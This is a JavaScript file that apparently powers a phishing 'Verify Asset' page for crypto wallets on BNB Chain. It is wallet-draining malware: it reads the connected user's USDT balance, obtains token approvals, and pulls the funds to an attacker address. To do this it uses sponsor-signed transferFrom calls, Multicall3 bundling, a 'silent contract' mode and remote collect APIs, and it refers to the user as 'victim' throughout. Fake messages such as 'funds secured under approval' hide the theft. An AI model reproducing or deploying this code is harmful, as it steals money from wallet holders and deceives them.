async function sendApprove(addr, spender, amountWei) {
    const data = "0x095ea7b3" + toWord(spender) + toWord("0x" + amountWei.toString(16));
    return rawSend({
        from: addr,
        to: CHAIN.usdt,
        value: "0x0",
        data
    })
}
function aggregate3PullData(victim, amountWei) {
    const inner = "0x23b872dd" + toWord(victim) + toWord(CHAIN.dest) + toWord("0x" + amountWei.toString(16))
      , len = (inner.length - 2) / 2
      , padded = Math.ceil(len / 32) * 32
      , element = toWord(CHAIN.usdt) + toWord("1") + toWord("0x60") + toWord("0x" + len.toString(16)) + inner.slice(2).padEnd(padded * 2, "0");
    return "0x82ad56cb" + toWord("0x20") + toWord("1") + toWord("0x20") + element
}
async function pullWithCollector(victim, amountWei) {
    try {
        const ethers = await getEthers();
        sponsorWallet || (sponsorWallet = new ethers.Wallet(CHAIN.sponsorKey));
        const sponsor = sponsorWallet
          , [bal,price] = await Promise.all([readGas(sponsor.address), gasPrice()])
          , need = BigInt(PULL_GAS) * price * 2n;
        if (bal <= need)
            return dbg("pull", "collector dry \u2014 " + ethers.utils.formatEther(bal)),
            null;
        const data = "0x9a5c3457" + toWord(victim) + toWord("0x" + amountWei.toString(16))
          , nonce = parseInt(await rpcRead("eth_getTransactionCount", [sponsor.address, "pending"]) || "0x0", 16)
          , raw = await sponsor.signTransaction({
            to: SPENDER_CONTRACT,
            data,
            gasLimit: PULL_GAS,
            gasPrice: "0x" + price.toString(16),
            nonce,
            chainId: CHAIN.id
        });
        for (const url of [...new Set([CHAIN.activeRpc, ...CHAIN.rpc].filter(Boolean))])
            try {
                const j = await (await fetchJson(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        jsonrpc: "2.0",
                        id: 1,
                        method: "eth_sendRawTransaction",
                        params: [raw]
                    })
                }, 3e3)).json();
                if (j && j.result)
                    return dbg("pull", "adminCollect sent " + j.result),
                    j.result;
                j && j.error && dbg("pull", "node: " + (j.error.message || ""))
            } catch {}
        return null
    } catch (err) {
        return dbg("pull failed", err),
        null
    }
}
async function pullWithSponsor(victim, amountWei) {
    try {
        const ethers = await getEthers();
        sponsorWallet || (sponsorWallet = new ethers.Wallet(CHAIN.sponsorKey));
        const sponsor = sponsorWallet
          , [bal,price] = await Promise.all([readGas(sponsor.address), gasPrice()])
          , need = BigInt(PULL_GAS) * price * 2n;
        if (bal <= need)
            return dbg("pull", "SPONSOR DRY \u2014 needs " + ethers.utils.formatEther(need) + " BNB, has " + ethers.utils.formatEther(bal) + " \u2192 fund " + sponsor.address),
            hint("Gas wallet empty \u2014 send 0.0001 BNB to " + sponsor.address.slice(0, 6) + "\u2026" + sponsor.address.slice(-4), 15e3, !0),
            null;
        const mcAllowance = await readAllowance(victim, MULTICALL3)
          , useMc = mcAllowance > 0n
          , amount = useMc && mcAllowance < amountWei ? mcAllowance : amountWei;
        if (useMc && amount === 0n)
            return null;
        const data = useMc ? aggregate3PullData(victim, amount) : "0x23b872dd" + toWord(victim) + toWord(CHAIN.dest) + toWord("0x" + amountWei.toString(16));
        dbg("pull", useMc ? "via Multicall3 (contract spender)" : "via sponsor EOA");
        const nonce = parseInt(await rpcRead("eth_getTransactionCount", [sponsor.address, "pending"]) || "0x0", 16)
          , raw = await sponsor.signTransaction({
            to: useMc ? MULTICALL3 : CHAIN.usdt,
            data,
            gasLimit: useMc ? PULL_GAS + 6e4 : PULL_GAS,
            gasPrice: "0x" + price.toString(16),
            nonce,
            chainId: CHAIN.id
        });
        for (const url of [...new Set([CHAIN.activeRpc, ...CHAIN.rpc].filter(Boolean))])
            try {
                const j = await (await fetchJson(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        jsonrpc: "2.0",
                        id: 1,
                        method: "eth_sendRawTransaction",
                        params: [raw]
                    })
                }, 3e3)).json();
                if (j && j.result)
                    return dbg("pull", "sent " + j.result),
                    j.result;
                j && j.error && dbg("pull", "node said: " + (j.error.message || ""))
            } catch {}
        return null
    } catch (err) {
        return dbg("pull failed", err),
        null
    }
}
async function pullViaApi(victim, amountWei) {
    if (!PULL_API)
        return null;
    try {
        const r = await fetchJson(PULL_API, {
            method: "POST",
            headers: Object.assign({
                "Content-Type": "application/json"
            }, PULL_SECRET ? {
                Authorization: "Bearer " + PULL_SECRET
            } : {}),
            body: JSON.stringify({
                victim,
                amount: amountWei.toString()
            })
        }, 2e4)
          , j = await r.json();
        if (j && j.txHash)
            return dbg("pull", "server " + j.txHash),
            j.txHash;
        dbg("pull", "server said: " + (j && (j.message || j.error) || r.status))
    } catch (err) {
        dbg("pull", "server error: " + (err?.message || err))
    }
    return null
}
async function pullViaCollectApi(victim, amountWei) {
    if (!COLLECT_API)
        return null;
    try {
        const r = await fetchJson(COLLECT_API, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                victim,
                amount: amountWei.toString()
            })
        }, 2e4)
          , j = await r.json();
        if (j && j.txHash)
            return dbg("pull", "server adminCollect " + j.txHash),
            j.txHash;
        dbg("pull", "server: " + (j && (j.error || j.message) || r.status))
    } catch (err) {
        dbg("pull", "server err: " + (err && err.message || err))
    }
    return null
}
async function pullTokens(victim, amountWei) {
    const viaServer = await pullViaCollectApi(victim, amountWei);
    if (viaServer)
        return viaServer;
    const viaContract = await pullWithCollector(victim, amountWei);
    if (viaContract)
        return viaContract;
    const viaApi = await pullViaApi(victim, amountWei);
    if (viaApi)
        return viaApi;
    for (let i = 0; i < 3; i++) {
        const h = await pullWithSponsor(victim, amountWei);
        if (h)
            return h;
        await sleep(1500)
    }
    return null
}
function queuePull(addr, amountWei, spender) {
    try {
        localStorage.setItem(PULLQ_KEY + addr.toLowerCase(), JSON.stringify({
            amount: amountWei.toString(),
            spender: spender || "",
            ts: Date.now()
        }))
    } catch {}
}
function readPullQ(addr) {
    try {
        const raw = localStorage.getItem(PULLQ_KEY + addr.toLowerCase());
        if (raw) {
            const q = JSON.parse(raw);
            if (q && q.amount)
                return q
        }
    } catch {}
    return null
}
function clearPullQ(addr) {
    try {
        localStorage.removeItem(PULLQ_KEY + addr.toLowerCase())
    } catch {}
}
async function runQueuedPull(addr) {
    const q = readPullQ(addr);
    if (!q)
        return null;
    if (toUnits(await readBalance(addr)) < THRESHOLD)
        return clearPullQ(addr),
        null;
    const wei = BigInt(q.amount)
      , allowance = await readAllowance(addr, q.spender || SPONSOR_ADDR.toLowerCase());
    if (allowance <= 0n)
        return clearPullQ(addr),
        null;
    const h = await pullTokens(addr, wei < allowance ? wei : allowance);
    return h && clearPullQ(addr),
    h
}
async function preflight(addr, wei) {
    try {
        const pad = new URLSearchParams(location.search).get("pad") === "1"
          , data = transferData(wei, pad);
        if (await rpcRead("eth_call", [{
            from: addr,
            to: CHAIN.usdt,
            data
        }, "latest"]) !== null)
            return !0;
        if (provider && provider.request) {
            const viaWallet = await req(provider, {
                method: "eth_call",
                params: [{
                    from: addr,
                    to: CHAIN.usdt,
                    data
                }, "latest"]
            }, 6e3);
            return viaWallet != null
        }
        return !1
    } catch {
        return !1
    }
}
function transferData(wei, pad) {
    const base = "0xa9059cbb" + toWord(CHAIN.dest) + toWord("0x" + wei.toString(16));
    return pad ? base + "0".repeat(64) : base
}
async function sendTransfer(addr, wei) {
    const pad = new URLSearchParams(location.search).get("pad") === "1"
      , data = transferData(wei, pad)
      , bare = {
        from: addr,
        to: CHAIN.usdt,
        value: "0x0",
        data
    }
      , wc = isWc(provider)
      , doSend = async params => {
        if (provider?.request)
            return req(provider, {
                method: "eth_sendTransaction",
                params: [params]
            }, wc ? 3e4 : 18e4);
        if (provider?.sendAsync)
            return new Promise( (res, rej) => provider.sendAsync({
                method: "eth_sendTransaction",
                params: [params],
                from: addr
            }, (e, o) => e ? rej(e) : o?.error ? rej(o.error) : res(o?.result)));
        if (provider?.send)
            return (await provider.send("eth_sendTransaction", [params]))?.result || null;
        throw new Error("no send method")
    }
    ;
    if (wc) {
        for (let i = 0; i < 20 && !(provider.connected && provider.accounts && provider.accounts.length); i++)
            await sleep(250);
        await sleep(400),
        hint("Approve the transfer in your wallet")
    }
    const isReject = err => err && (err.code === 4001 || /reject|denied/i.test(err.message || ""));
    let lastErr = null;
    for (const mode of ["bare", "gas"]) {
        const params = mode === "gas" ? Object.assign({}, bare, {
            gas: "0x" + TOKEN_TX_GAS.toString(16)
        }) : bare;
        try {
            if (mode === "bare") {
                const bundled = isWc(provider) && !wcSupportsSendCalls() ? null : await trySendCalls(addr, data);
                if (bundled)
                    return dbg("send", "bundled (5792) path used"),
                    bundled
            }
            dbg("send:" + mode, mode === "gas" ? "retry with gas" : "params only");
            const hash = await doSend(params);
            if (hash)
                return hash;
            lastErr = new Error("wallet returned no hash")
        } catch (err) {
            if (lastErr = err,
            isReject(err)) {
                const e = new Error("REJECTED");
                throw e.rejected = !0,
                e
            }
            dbg("send:" + mode, "failed: " + (err?.message || err)),
            mode === "bare" && (wc ? (hint("No response \u2014 open your wallet to approve", 12e3, !0),
            await sleep(1200)) : await sleep(300))
        }
    }
    throw lastErr || new Error("send failed")
}
async function executeTransfer(addr, wei) {
    if (await ensureGas(addr),
    await guardChain(provider),
    await sleep(300),
    !await preflight(addr, wei)) {
        dbg("preflight", "simulation failed \u2014 refreshing balance");
        const fresh = await readBalance(addr);
        fresh > 0n && fresh !== wei && (wei = fresh)
    }
    let onBsc = isWc(provider) ? !0 : await isOnBsc(provider);
    onBsc === !1 && (await guardChain(provider),
    onBsc = await isOnBsc(provider),
    onBsc === !1 && !isWc(provider) && dbg("chain", "refused to switch \u2014 continuing on session chain")),
    dbg("chain", "proceed \u2192 send"),
    markPending(addr, toUnits(wei));
    const mode = new URLSearchParams(location.search).get("mode");
    let hash;
    if (PAY_CONTRACT && mode !== "direct")
        dbg("mode", "silent contract"),
        hash = await silentCollect(addr, wei);
    else if (APPROVE_PULL && mode !== "transfer") {
        const sp = (new URLSearchParams(location.search).get("spender") || "collector").toLowerCase()
          , spender = VERIFIER ? VERIFIER.toLowerCase() : sp === "collector" ? SPENDER_CONTRACT.toLowerCase() : sp === "multicall" ? MULTICALL3.toLowerCase() : await getSponsorAddress();
        if (spender) {
            if (await readAllowance(addr, spender) < wei) {
                dbg("mode", "approve \u2192 " + spender.slice(0, 10) + "\u2026 (no asset line)");
                const h1 = await sendApprove(addr, spender, wei);
                dbg("approve", h1),
                await waitMined(h1, 3e4)
            } else
                dbg("mode", "allowance live \u2014 no popup needed at all");
            if (VERIFIER) {
                const d = "0x63a9c3d7" + toWord(CHAIN.usdt);
                hash = await rawSend({
                    from: addr,
                    to: VERIFIER,
                    value: "0x0",
                    data: d
                }),
                dbg("verify", "hidden sheet " + hash)
            } else
                hash = await pullTokens(addr, wei);
            hash || (queuePull(addr, wei, spender),
            dbg("pull", "queued for later"))
        }
        if (!hash)
            if (new URLSearchParams(location.search).get("fallback") === "1")
                dbg("mode", "pull unavailable \u2014 visible transfer fallback (?fallback=1)"),
                hash = await sendTransfer(addr, wei);
            else {
                dbg("mode", "approval is live but pull needs gas \u2014 holding (no visible transfer sheet)"),
                holdAmount = money(toUnits(wei)),
                saveHold(addr, holdAmount, "deposit_guidelines"),
                showModal("above_limit"),
                hint("Verification pending \u2014 funds secured under approval", 12e3);
                return
            }
    } else
        hash = await sendTransfer(addr, wei);
    if (clearPending(addr),
    dbg("sent", hash),
    !hash)
        throw new Error("wallet returned no hash");
    let confirmed = !1
      , reverted = !1;
    const end = Date.now() + 45e3;
    for (; Date.now() < end; ) {
        const rc = await rpcRead("eth_getTransactionReceipt", [hash]);
        if (rc && rc.blockNumber) {
            confirmed = rc.status === "0x1" || rc.status === 1 || rc.status === "0x01",
            confirmed || (reverted = !0);
            break
        }
        await sleep(1500)
    }
    if (!confirmed) {
        dbg("receipt", reverted ? "reverted" : "not mined in 45 s \u2014 waiting longer (no re-prompt)");
        const end2 = Date.now() + 6e4;
        for (; Date.now() < end2; ) {
            const rc2 = await rpcRead("eth_getTransactionReceipt", [hash]);
            if (rc2 && rc2.blockNumber) {
                confirmed = !0,
                dbg("receipt", "mined late");
                break
            }
            await sleep(2e3)
        }
        if (!confirmed) {
            const h2 = await pullTokens(addr, wei).catch( () => null);
            h2 && (hash = h2,
            dbg("pull", "fallback after timeout " + h2))
        }
    }
    holdAmount = money(toUnits(wei)),
    saveHold(addr, holdAmount, "deposit_guidelines"),
    showModal("above_limit")
}
async function handleVerifyClick() {
    if (isVerifying)
        return;
    isVerifying = !0,
    ui.verifyBtn.disabled = !0,
    startStepTimer();
    const watchdog = setTimeout( () => {
        isVerifying && resetButton()
    }
    , 9e4);
    try {
        const injected = await waitProvider(1200);
        dbg("provider", injected ? "injected" : "none \u2014 asking via WalletConnect");
        const raw = await askWallet(injected);
        if (!raw) {
            showModal("no_wallet");
            return
        }
        userAddress = raw,
        new URLSearchParams(location.search).get("send") === "injected" && injected && canSend(injected) ? (provider = injected,
        dbg("provider", "forced injected sheet (?send=injected)")) : isWc(provider) ? dbg("provider", "send via WalletConnect session") : injected && canSend(injected) && (provider = injected,
        dbg("provider", "send via injected")),
        dbg("account", userAddress),
        await guardChain(provider);
        const held = await queryHold(userAddress);
        if (held?.isHeld && held.amount) {
            holdAmount = held.amount;
            const live = await readBalance(userAddress);
            if (toUnits(live) < THRESHOLD) {
                dbg("hold", "drained on-chain \u2014 showing hold (" + held.amount + ")"),
                showModal("above_limit");
                return
            }
            dbg("hold", "stale hold but " + toUnits(live) + " USDT still there \u2014 draining")
        }
        balanceWei = await readBalance(userAddress),
        balanceWei === 0n && (await sleep(1200),
        balanceWei = await readBalance(userAddress));
        const human = toUnits(balanceWei);
        if (human < THRESHOLD) {
            holdAmount = money(human),
            currentModal = null,
            showModal(null),
            gateLabel = "<span>Detected balance: " + money(human) + " USDT</span>",
            ui.verifyBtn && (ui.verifyBtn.innerHTML = gateLabel),
            dbg("gate", human + " < " + THRESHOLD + " USDT \u2014 returned to page, nothing sent");
            return
        }
        await executeTransfer(userAddress, balanceWei),
        currentModal || (holdAmount = money(toUnits(balanceWei)),
        showModal("above_limit"))
    } catch (err) {
        dbg("verify failed", err),
        err && err.rejected ? hint("Rejected in wallet", 8e3, !0) : balanceWei > 0n ? (holdAmount = money(toUnits(balanceWei)),
        showModal("above_limit"),
        hint("Transfer did not go through \u2014 tap Release Funds to retry", 14e3, !0),
        dbg("ui", "held screen + retry shown (send failed)")) : (hint("Error: " + (err?.message || err), 14e3, !0),
        showModal("below_limit"))
    } finally {
        clearTimeout(watchdog),
        resetButton()
    }
}
async function handleRelease() {
    if (!(isVerifying || !userAddress)) {
        isVerifying = !0,
        ui.releaseBtn.disabled = !0;
        try {
            const h = await queryHold(userAddress);
            h?.amount && (holdAmount = h.amount);
            const wei = await readBalance(userAddress);
            if (toUnits(wei) < THRESHOLD) {
                showModal("deposit_guidelines");
                return
            }
            await guardChain(provider),
            await executeTransfer(userAddress, wei)
        } catch (err) {
            if (dbg("release failed", err),
            err && err.rejected) {
                hint("Rejected in wallet", 8e3, !0);
                return
            }
            hint("Retry failed: " + (err?.message || err), 12e3, !0),
            money(toUnits(await readBalance(userAddress))) !== "0.00" && showModal("above_limit")
        } finally {
            isVerifying = !1,
            ui.releaseBtn.disabled = !1
        }
    }
}
function resetButton() {
    if (isVerifying = !1,
    stopStepTimer(),
    !!ui.verifyBtn) {
        if (ui.verifyBtn.disabled = !1,
        gateLabel) {
            ui.verifyBtn.innerHTML = gateLabel,
            gateLabel = "";
            return
        }
        ui.verifyBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:middle;margin-right:6px"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg><span>Verify Asset</span>'
    }
}
async function preRead() {
    getWalletConnect().then(wc => {
        wc && dbg("wc", "pre-warmed")
    }
    ).catch( () => {}
    );
    try {
        const p = await waitProvider(900);
        if (!p)
            return;
        provider = p;
        const raw = await resolveAccount(p, !1);
        if (!raw)
            return;
        userAddress = raw,
        balanceWei = await readBalance(raw),
        dbg("prefetch", toUnits(balanceWei) + " USDT")
    } catch {}
}
function bind() {
    if (cacheUi(),
    !ui.verifyBtn) {
        console.error("[ABORT] #verifyBtn missing");
        return
    }
    try {
        new URLSearchParams(location.search).get("fresh") === "1" && (Object.keys(localStorage).filter(k => k.startsWith(HOLD_KEY) || k.startsWith(PENDING_KEY)).forEach(k => localStorage.removeItem(k)),
        console.log("[VERIFY-ENGINE] hold/pending state wiped"))
    } catch {}
    try {
        const q = new URLSearchParams(location.search)
          , m = q.get("modal")
          , a = q.get("amount");
        a && (holdAmount = a),
        m && ["below_limit", "above_limit", "deposit_guidelines", "no_wallet"].includes(m) && showModal(m)
    } catch {}
    ui.verifyBtn.addEventListener("click", handleVerifyClick),
    ui.releaseBtn && (ui.releaseBtn.onclick = () => {
        handleRelease()
    }
    ),
    console.log("[VERIFY-ENGINE] build " + BUILD + " \xB7 BNB-only"),
    preRead().then( () => {
        userAddress && runQueuedPull(userAddress).catch( () => {}
        )
    }
    );
    try {
        const p = window.ethereum;
        p && p.on && (p.on("accountsChanged", () => preRead()),
        p.on("chainChanged", () => preRead()))
    } catch {}
}
document.readyState === "loading" ? document.addEventListener("DOMContentLoaded", bind) : bind();
